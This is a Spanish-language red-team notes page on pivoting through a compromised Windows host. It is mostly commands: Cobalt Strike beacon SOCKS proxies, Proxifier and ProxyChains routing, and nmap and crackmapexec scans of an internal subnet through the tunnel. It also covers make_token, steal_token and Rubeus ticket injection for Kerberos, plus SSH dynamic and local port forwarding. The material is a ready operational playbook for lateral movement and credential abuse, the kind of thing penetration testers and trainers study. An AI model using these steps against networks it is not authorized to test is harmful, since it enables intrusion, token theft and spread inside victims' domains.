---
tags: [lateral-movement, pivoting, socks, proxifier, cobalt-strike]
status: done
platform: windows
---

# Pivoting

> Tunelizar tráfico a través de un host comprometido para acceder a segmentos de red no alcanzables directamente.

---

## SOCKS4a via Cobalt Strike

```
# Crear proxy SOCKS4a en el beacon
beacon> socks 1080

# Verificar que está activo
# En la pestaña "Proxy Pivots" del CS Team Server
```

Esto abre el puerto 1080 en el **Team Server** (no en el beacon). El tráfico que entra al Team Server por ese puerto se tuneliza a través del beacon al destino.

---

## Proxifier (Windows) — Rutear tráfico por el proxy

```
Profile → Proxy Servers:
  Address: <IP_TEAMSERVER>
  Port: 1080
  Protocol: SOCKS4

Profile → Proxification Rules:
  Action: Proxy SOCKS4 <teamserver>:1080
  Applications: target-tool.exe
```

---

## Autenticación a través del SOCKS

### Autenticación NTLM/Texto Plano

```
# Con credenciales de texto plano
beacon> make_token DOMAIN\usuario password
# Luego el tráfico NTLM del proxy usa este token
```

### Autenticación Kerberos (sin texto plano)

El problema: herramientas como BloodHound o WMIexec que van por el proxy necesitan Kerberos, pero el proxy SOCKS4a no entiende de tickets.

**Solución con Rubeus:**

```
# 1. Crear proceso aislado con el TGT del usuario objetivo inyectado
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.local /username:admin /password:FakePass /ticket:<base64_TGT>

# 2. Rubeus devuelve un PID con el ticket en su contexto
# 3. Robar token de ese proceso
beacon> steal_token <PID>

# 4. Solicitar TGS para el servicio destino (ej: cifs para SMB)
# Desde cmd.exe con el token robado:
Rubeus.exe asktgs /ticket:<TGT_base64> /service:cifs/target-server.corp.local /ptt

# 5. Ahora el tráfico Kerberos de ese proceso va autenticado
```

---

## ProxyChains (Linux)

```bash
# /etc/proxychains4.conf
socks4 <TEAMSERVER_IP> 1080

# Rutear herramienta por el proxy
proxychains4 nmap -sT -Pn -p 445,3389 10.10.10.0/24
proxychains4 crackmapexec smb 10.10.10.0/24
```

---

## Pivoting SSH (sin CS)

```bash
# SOCKS dinámico via SSH
ssh -D 1080 -N user@pivot-host

# Port forwarding específico
ssh -L 8443:internal-server:443 user@pivot-host
```

